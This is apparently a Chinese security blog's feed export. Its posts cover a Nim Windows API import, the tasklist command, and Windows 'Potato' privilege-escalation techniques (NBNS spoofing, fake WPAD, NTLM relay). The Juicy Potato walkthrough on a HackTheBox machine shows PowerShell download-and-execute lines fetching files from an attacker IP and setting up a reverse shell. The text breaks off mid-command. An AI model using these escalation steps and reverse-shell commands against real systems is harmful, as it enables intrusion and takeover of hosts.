n><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">proc LoadLibraryExW*(lpLibFileName: LPCWSTR, hFile: HANDLE, dwFlags: DWORD): HMODULE {.winapi, stdcall, dynlib: "kernel32", importc.}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> nim </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nim学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tasklist的妙用</title>
      <link href="/2021/10/28/tasklist-de-miao-yong/"/>
      <url>/2021/10/28/tasklist-de-miao-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>之前的我 一直是</p><pre class="line-numbers language-none"><code class="language-none">tasklist /svc 用来查看进程服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>今天看到一个新奇的命令 记录一下</p><pre class="line-numbers language-none"><code class="language-none">tasklist /m xxx.dll 查看所有加载xxx.dll的进程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261304074.png" alt="image-20211112203705399"></p><p>查看了tasklit相关文档</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\12550&gt;tasklist /?TASKLIST [/S system [/U username [/P [password]]]]         [/M [module] | /SVC | /V] [/FI filter] [/FO format] [/NH]描述:    该工具显示在本地或远程机器上当前运行的进程列表。参数列表:   /S     system           指定连接到的远程系统。   /U     [domain\]user    指定应该在哪个用户上下文执行这个命令。   /P     [password]       为提供的用户上下文指定密码。如果省略，则                           提示输入。   /M     [module]         列出当前使用所给 exe/dll 名称的所有任务。                           如果没有指定模块名称，显示所有加载的模块。   /SVC                    显示每个进程中主持的服务。   /APPS 显示 Microsoft Store 应用及其关联的进程。   /V                      显示详细任务信息。   /FI    filter           显示一系列符合筛选器                           指定条件的任务。   /FO    format           指定输出格式。                           有效值: "TABLE"、"LIST"、"CSV"。   /NH                     指定列标题不应该                           在输出中显示。                           只对 "TABLE" 和 "CSV" 格式有效。   /?                      显示此帮助消息。筛选器:    筛选器名称     有效运算符           有效值    -----------     ---------------           --------------------------    STATUS          eq, ne                    RUNNING | SUSPENDED                                              NOT RESPONDING | UNKNOWN    IMAGENAME       eq, ne                    映像名称    PID             eq, ne, gt, lt, ge, le    PID 值    SESSION         eq, ne, gt, lt, ge, le    会话编号    SESSIONNAME     eq, ne                    会话名称    CPUTIME         eq, ne, gt, lt, ge, le    CPU 时间，格式为                                              hh:mm:ss。                                              hh - 小时，                                              mm - 分钟，ss - 秒    MEMUSAGE        eq, ne, gt, lt, ge, le    内存使用(以 KB 为单位)    USERNAME        eq, ne                    用户名，格式为                                              [域\]用户    SERVICES        eq, ne                    服务名称    WINDOWTITLE     eq, ne                    窗口标题    模块         eq, ne                    DLL 名称注意: 当查询远程计算机时，不支持 "WINDOWTITLE" 和 "STATUS"      筛选器。Examples:    TASKLIST    TASKLIST /M    TASKLIST /V /FO CSV    TASKLIST /SVC /FO LIST    TASKLIST /APPS /FI "STATUS eq RUNNING"    TASKLIST /M wbem*    TASKLIST /S system /FO LIST    TASKLIST /S system /U 域\用户名 /FO CSV /NH    TASKLIST /S system /U username /P password /FO TABLE /NH    TASKLIST /FI "USERNAME ne NT AUTHORITY\SYSTEM" /FI "STATUS eq running"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><pre class="line-numbers language-none"><code class="language-none">1.tasklist竟然被列在ATT&amp;CK S0057,与T1057(进程探测)、T1058(安全软件探测)、T1007(系统服务发现)2.tasklist竟然可以列远程机器的进程列表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 红队技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tasklist的妙用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Potato提权</title>
      <link href="/2021/10/28/tu-dou-xiao-jie/"/>
      <url>/2021/10/28/tu-dou-xiao-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们拿到webshell 却苦于无法提权</p><p>早之前有巴西烤肉提权，有pr提权</p><p>今天 来一个土豆提权合集</p><p>妈妈再也不担心我的webshell无法提权了</p><h2 id="Hot-Potato"><a href="#Hot-Potato" class="headerlink" title="Hot Potato"></a>Hot Potato</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>利用 Windows 中的已知问题在默认配置中获得本地权限提升</p><p>即 NTLM 中继(特别是 HTTP-&gt;SMB 中继)和 NBNS 欺骗</p><p>攻击者可以在安装了Windows操作系统的工作站中将自己的低权限提升至<code>NT AUTHORITY\SYSTEM</code></p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Windows 7、8、10、Server 2008 和 Server 2012</p><p>为了更深入地了解这种技术，建议研究人员发布/视频：</p><ul><li><a href="https://foxglovesecurity.com/2016/01/16/hot-potato/">https://foxglovesecurity.com/2016/01/16/hot-potato/</a></li><li><a href="https://www.youtube.com/watch?v=8Wjs__mWOKI">https://www.youtube.com/watch?v=8Wjs__mWOKI</a></li></ul><h3 id="原理详解"><a href="#原理详解" class="headerlink" title="原理详解"></a>原理详解</h3><p>主要分为3步</p><h4 id="1-本地NBNS欺骗"><a href="#1-本地NBNS欺骗" class="headerlink" title="1.本地NBNS欺骗"></a>1.本地NBNS欺骗</h4><p>NBNS 是 Windows 环境中常用的名称解析广播 UDP 协议。当我们(或 Windows)执行 DNS 查找时，Windows 首先会检查<code>hosts</code>文件</p><p>host文件默认位置：</p><pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\drivers\etc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不存在，它将尝试进行 DNS 查找</p><p>如果DNS 查找失败，将执行 NBNS 查找</p><p>NBNS 协议基本上只是询问本地广播域上的所有主机<code>谁知道主机 XXX 的 IP 地址？</code> </p><p>这个时候，网络上的任何主机都可以随意响应。</p><p>在渗透测试中，我们经常嗅探网络流量并响应在本地网络上观察到的 NBNS 查询。我们将模拟所有主机，用我们的 IP 地址回复每个请求，希望由此产生的连接能做一些有趣的事情，比如尝试进行身份验证。</p><p>但是出于权限提升的目的，我们不能假设我们能够嗅探网络流量。<strong>因为这需要本地管理员访问</strong>。那么我们如何才能完成NBNS欺骗呢？</p><p>如果我们可以提前知道目标机器（在这种情况下，我们的目标是 127.0.0.1）将发送 NBNS 查询的主机名，我们就可以制作一个假响应并用 NBNS 响应非常快速地淹没目标主机（因为它是 UDP 协议）。一个复杂的问题是 NBNS 数据包中的一个 2 字节字段，TXID，必须在请求和响应中匹配，我们无法看到请求。我们可以通过快速访问所有 65536 个可能值来应对这个问题。</p><p>如果我们的目标网络有我们想要欺骗的主机的 DNS 记录怎么办？我们可以使用一种称为 <strong>UDP 端口耗尽的技术</strong>来强制系统上的所有 DNS 查找失败。我们所做的就是绑定到每个 UDP 端口。这会导致 DNS 失败，因为请求将没有可用的 UDP 源端口。当 DNS 失败时，NBNS 将成为后备。</p><h4 id="2-虚假的WPAD代理服务器"><a href="#2-虚假的WPAD代理服务器" class="headerlink" title="2. 虚假的WPAD代理服务器"></a>2. 虚假的WPAD代理服务器</h4><p>在 Windows 中，Internet Explorer 默认会通过访问 URL：<a href="http://wpad/wpad.dat">http://wpad/wpad.dat</a></p><p>自动尝试检测网络代理设置配置</p><p>它既然适用于某些 Windows 服务！例如 Windows 更新，但具体如何以及在什么条件下似乎取决于版本。</p><p>当然是访问 URL：<a href="http://wpad/wpad.dat%E4%B8%8D%E4%BC%9A%E5%AD%98%E5%9C%A8%E4%BA%8E%E6%89%80%E6%9C%89%E7%BD%91%E7%BB%9C%E4%B8%8A%EF%BC%8C%E5%9B%A0%E4%B8%BA%E4%B8%BB%E6%9C%BA%E5%90%8D%60wpad%60%E4%B8%8D%E4%B8%80%E5%AE%9A%E5%AD%98%E5%9C%A8%E4%BA%8E">http://wpad/wpad.dat不会存在于所有网络上，因为主机名`wpad`不一定存在于</a> DNS 名称服务器中</p><p>那么，虚假的WPAD代理服务器和本地NBNS欺骗相结合，我们可以使用 本地NBNS 欺骗来欺骗主机名</p><p>凭借欺骗 NBNS 响应的能力，我们可以将 NBNS 欺骗器定位在 127.0.0.1</p><p>我们用主机<code>WPAD</code>或<code>WPAD.DOMAIN.TLD</code>的NBNS响应数据包淹没目标机器(我们自己的机器)</p><p>WPAD主机的IP地址为127.0.0.1</p><p>同时，我们在 127.0.0.1 本地运行一个 HTTP 服务器。当它收到对URL：<a href="http://wpad/wpad.dat%E7%9A%84%E8%AF%B7%E6%B1%82%E6%97%B6%EF%BC%8C%E5%AE%83%E4%BC%9A%E5%93%8D%E5%BA%94%E5%A6%82%E4%B8%8B%E5%86%85%E5%AE%B9%EF%BC%9A">http://wpad/wpad.dat的请求时，它会响应如下内容：</a></p><pre class="line-numbers language-none"><code class="language-none">FindProxyForURL(url,host){if (dnsDomainIs(host, "localhost")) return "DIRECT";return "PROXY 127.0.0.1:80";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这将导致目标上的所有 HTTP 流量都通过我们在 127.0.0.1 上运行的服务器重定向</p><p>注：即使是由低权限用户执行的这种攻击也会影响机器的所有用户，这包括管理员和系统帐户</p><h4 id="3-HTTP-gt-SMB-NTLM-中继"><a href="#3-HTTP-gt-SMB-NTLM-中继" class="headerlink" title="3.HTTP -> SMB NTLM 中继"></a>3.HTTP -&gt; SMB NTLM 中继</h4><p>NTLM 中继是一种众所周知但经常被误解的针对 Windows NTLM 身份验证的攻击。NTLM 协议容易受到中间人攻击。如果攻击者可以欺骗用户尝试使用 NTLM 对其机器进行身份验证，他可以将该身份验证尝试中继到另一台机器！</p><p>此攻击的旧版本让受害者尝试使用带有 NTLM 身份验证的 SMB 协议向攻击者进行身份验证。然后，攻击者会将这些凭据中继回受害者的计算机，并使用类似”psexec”的技术获得远程访问权限。</p><p>微软通过使用已经在进行中的challenge来禁止相同协议的 NTLM 身份验证来修补这个问题</p><p>这意味着从一台主机到其自身的 SMB-&gt;SMB NTLM 中继将不再起作用</p><p>但是，跨协议攻击，像HTTP-&gt;SMB 仍然可以正常工作</p><p>现在所有 HTTP 流量都可能流经我们控制的 HTTP 服务器，我们可以做一些事情，比如将它们重定向到某个将请求 NTLM 身份验证的地方。</p><p>在Hot Potato漏洞利用中，所有 HTTP 请求都通过 302 重定向重定向到URL：<a href="http://localhost/GETHASHESxxxxx">http://localhost/GETHASHESxxxxx</a></p><p>其中 xxxxx 是某个唯一标识符。请求URL：<a href="http://localhost/GETHASHESxxxxx">http://localhost/GETHASHESxxxxx</a> 以 NTLM 身份验证的 401 请求响应。</p><p>然后将任何 NTLM 凭据中继到本地 SMB 侦听器以创建运行用户定义命令的新系统服务。</p><p>当有问题的 HTTP 请求来自高权限帐户时，例如，当它是来自 Windows 更新服务的请求时，此命令将以<code>NT AUTHORITY\SYSTEM</code>权限运行，从而完成了提权！</p><h3 id="原理概述"><a href="#原理概述" class="headerlink" title="原理概述"></a>原理概述</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111031811392.png" alt="image-20211022212051876"></p><pre class="line-numbers language-none"><code class="language-none">1.本地NBNS Spoofer：冒充名称解析，强制系统下载恶意WAPD配置2.伪造WPAD代理服务器：部署malicios WAPD配置，强制系统进行NTLM认证3.HTTP -&gt; SMB NTLM 中继：将 WAPD NTLM 令牌中继到 SMB 服务以创建提升的进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p><a href="https://github.com/foxglovesec/Potato">https://github.com/foxglovesec/Potato</a></p><h4 id="Windows-7"><a href="#Windows-7" class="headerlink" title="Windows 7"></a>Windows 7</h4><p>通过Windows Defender更新机制可以相当可靠地利用 Windows 7</p><p>执行命令：</p><pre class="line-numbers language-none"><code class="language-none">Potato.exe -ip -cmd [cmd to run] -disable_exhaust true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：这将启动 NBNS 欺骗程序，将<code>WPAD</code>欺骗到 127.0.0.1，然后检查 Windows Defender 更新</p><p>如果我们的网络已经有<code>WPAD</code>的 DNS 条目，参数使用：<code>-disable_exhaust false</code></p><h4 id="Windows-Server-2008"><a href="#Windows-Server-2008" class="headerlink" title="Windows Server 2008"></a>Windows Server 2008</h4><p>由于 Windows Server 不附带 Defender，所以需要另一种方法</p><p>我们可以简单地检查 Windows 更新</p><p>执行命令：</p><pre class="line-numbers language-none"><code class="language-none">Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true -spoof_host WPAD.EMC.LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功运行后，只需检查 Windows 更新。如果没有触发，请等待漏洞利用运行约 30m 并再次检查。如果它仍然不起作用，请尝试实际下载更新。</p><p>如果我们的网络已经有<code>WPAD</code>的 DNS 条目，参数使用：<code>-disable_exhaust false</code>，但它可能会执行不起来</p><p>因为执行<code>DNS端口耗尽</code>会导致所有 DNS 查找失败</p><p>在联系 WPAD 之前，Windows 更新过程可能需要进行一些 DNS 查找</p><p>在这种情况下，我们必须正确确定时间，才能使其正常工作</p><h4 id="Windows-8-10-Server-2012"><a href="#Windows-8-10-Server-2012" class="headerlink" title="Windows 8/10/Server 2012"></a>Windows 8/10/Server 2012</h4><p>在Windows 8/10/Server 2012中，Windows Update 似乎不再遵守<code>Internet 选项</code>中设置的代理设置，或检查 WPAD</p><p>而是使用<code>netsh winhttp 代理</code>控制 Windows 更新的代理设置</p><p>依赖 Windows 的一个新功能-&gt;<code>不受信任证书的自动更新程序</code></p><p>具体可以参考这里：<a href="https://support.microsoft.com/en-us/kb/2677070">https://support.microsoft.com/en-us/kb/2677070</a></p><p>简单来说，就是一种自动更新机制，该机制每天下载证书信任列表 (CTL)</p><p>执行命令：</p><pre class="line-numbers language-none"><code class="language-none">Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：我们需要等待24 小时或找到其他方式来触发此更新。</p><p>如果我们的网络已经有<code>WPAD</code>的 DNS 条目，可以尝试端口耗尽，但是会很麻烦</p><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>Microsoft 通过使用已经在进行中的质询来禁止相同协议的 NTLM 身份验证来修补此问题 (MS16-075)。这意味着从一台主机到其自身的 SMB-&gt;SMB NTLM 中继将不再起作用。MS16-077 WPAD 名称解析将不使用 NetBIOS (CVE-2016-3213) 并且在请求 PAC 文件时不发送凭据 (CVE-2016-3236)。WAPD MITM Attack 已修补。</p><h2 id="Rotten-Potato"><a href="#Rotten-Potato" class="headerlink" title="Rotten Potato"></a>Rotten Potato</h2><p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-075">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-075</a></p><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><p>此技术不适用于 &gt;= Windows 10 1809 和 Windows Server 2019 的版本</p><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>立即触发，而不是有时必须等待 Windows 更新</p><p>Rotten Potato相当复杂，但主要使用了 3 个东西</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><pre class="line-numbers language-none"><code class="language-none">1.通过NT AUTHORITY/SYSTEM运行的RPC将尝试通过CoGetInstanceFromIStorage API调用向我们的本地代理进行身份验证2.135 端口的RPC将用于回复第一个RPC正在执行的所有请求充当模板3.AcceptSecurityContextAPI调用以在本地模拟NT AUTHORITY/SYSTEM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="过程概述"><a href="#过程概述" class="headerlink" title="过程概述"></a>过程概述</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111031811393.png" alt="image-20211022212121001"></p><pre class="line-numbers language-none"><code class="language-none">1. 使用CoGetInstanceFromIStorage API 调用欺骗RPC,对代理进行身份验证.在此调用中指定了代理 IP/端口2. RPC 向代理发送 NTLM 协商包3. 代理依赖的NTLM协商到RPC在端口135，被用作模板。同时，执行对AcceptSecurityContext的调用以强制进行本地身份验证注:此包被修改为强制本地身份验证.4. &amp; 5. RPC 135和AcceptSecurityContext用NTLM Challenge回复6. 将两个数据包的内容混合以匹配本地协商并转发到RPC7. RPC使用发送到AcceptSecurityContext(8.)的NLTM Auth包进行响应，并执行模拟(9.)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h3><p><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>DCOM 不与我们的本地侦听器交谈，因此没有 MITM 和漏洞利用。</li><li>将数据包发送到我们控制下侦听端口 135 的主机，然后将数据转发到我们的本地 COM 侦听器不起作用。问题是在这种情况下，客户端不会协商本地身份验证。</li></ul><h2 id="Lonely-Potato"><a href="#Lonely-Potato" class="headerlink" title="Lonely Potato"></a>Lonely Potato</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>Lonely Potato是Rotten Potato的改编版，不依赖meterpreter和Decoder制作的”隐身”模块。</p><p><a href="https://decoder.cloud/2017/12/23/the-lonely-potato/">https://decoder.cloud/2017/12/23/the-lonely-potato/</a></p><h3 id="后续-1"><a href="#后续-1" class="headerlink" title="后续"></a>后续</h3><p>Lonely Potato 已被弃用</p><h2 id="Juicy-Potato"><a href="#Juicy-Potato" class="headerlink" title="Juicy Potato"></a>Juicy Potato</h2><p>Juicy Potato允许以更灵活的方式利用该漏洞。在这种情况下，<a href="http://ohpe.it/juicy-potato/">ohpe 和解码器</a>在 Windows 构建审查期间发现了一个设置，其中BITS被故意禁用并占用了端口6666，因此Rotten Potato PoC 将不起作用。</p><h3 id="什么是-BITS-和-CLSID？"><a href="#什么是-BITS-和-CLSID？" class="headerlink" title="什么是 BITS 和 CLSID？"></a>什么是 BITS 和 CLSID？</h3><ul><li>CLSID是标识 COM 类对象的全局唯一标识符。它是一个类似UUID的标识符。</li><li>程序员和系统管理员使用后台智能传输服务 (BITS)从 HTTP Web 服务器和 SMB 文件共享下载文件或将文件上传到 HTTP Web 服务器和 SMB 文件共享。关键是BIT实现了IMarshal接口并允许代理声明强制 NTLM 身份验证。</li></ul><p>Rotten Potato的 PoC 使用带有默认 CLSID 的 BITS</p><pre class="line-numbers language-none"><code class="language-none">// Use a known local system service COM server, in this cast BITSv1Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>他们发现除了 BITS 之外，还有几个进程外 COM 服务器由可能被滥用的特定 CLSID 标识。他们至少需要：</p><ul><li>可由当前用户实例化，通常是具有模拟权限的服务用户</li><li>实现IMarshal接口</li><li>以提升的用户身份运行（SYSTEM、Administrator，…）</li></ul><p>具体可以参考这里：<a href="http://ohpe.it/juicy-potato/CLSID/">http://ohpe.it/juicy-potato/CLSID/</a></p><h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><ul><li>我们不需要有一个meterpreter shell</li><li>我们可以指定我们的 COM 服务器监听端口</li><li>我们可以使用 CLSID 指定滥用</li></ul><h3 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h3><p>使用的环境是：HackTheBox-Jeeves</p><p>Exp下载地址：<a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p><p>首先检查为此用户启用的系统特权</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111031811395.png" alt="image-20211024112732458"></p><p>烂土豆可执行文件的要求</p><p>它需要 3 个强制参数</p><ul><li><strong>-t：</strong>创建进程调用。对于这个选项，我们将使用*来测试这两个选项。</li><li><strong>-p：</strong>要运行的程序。我们需要创建一个文件，将反向 shell 发送回我们的攻击机器。</li><li><strong>-l：</strong> COM 服务器监听端口。这可以是任何东西。我们将使用 3333</li></ul><p>使用powershell快速上传</p><pre class="line-numbers language-none"><code class="language-none">(new-object net.webclient).downloadfile('http://10.10.14.40:5555/1.exe', 'C:\Users\kohsuke\desktop\1.exe')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111031811396.png" alt="image-20210822181124649"></p><p>我们使用<code>Invoke-PowerShellTcp.ps1</code>进行反弹shell</p><p>在脚本末尾添加</p><pre class="line-numbers language-none"><code class="language-none">Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -Port 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>kali上创建一个<code>shell.bat</code>文件，该文件下载<code>Invoke-PowerShellTcp.ps1</code> PowerShell脚本并运行它</p><pre class="line-numbers language-none"><code class="language-none">powershell -c iex(new-object net.webclient).downloadstring('http://x.x.x.x:5555/Invoke-PowerShellTcp.ps1')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目标机器上</p><pre class="line-numbers language-none"><code class="language-none">(new-object 